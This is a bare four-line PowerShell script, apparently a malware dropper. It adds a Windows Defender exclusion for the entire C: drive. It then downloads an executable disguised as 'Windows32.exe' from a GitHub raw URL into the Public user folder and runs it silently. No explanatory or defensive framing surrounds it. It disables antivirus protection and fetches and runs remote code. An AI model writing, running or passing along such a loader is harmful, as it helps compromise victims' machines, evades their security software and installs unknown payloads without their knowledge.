Add-MpPreference -ExclusionPath 'C:\\'
Invoke-WebRequest -Uri 'https://github.com/Ilyaskand/e/raw/refs/heads/main/Windows32.exe' -OutFile 'C:\\Users\\Public\\Windows32.exe'
Start-Process 'C:\\Users\\Public\\Windows32.exe' -ArgumentList '/silent' -NoNewWindow -Wait
exit
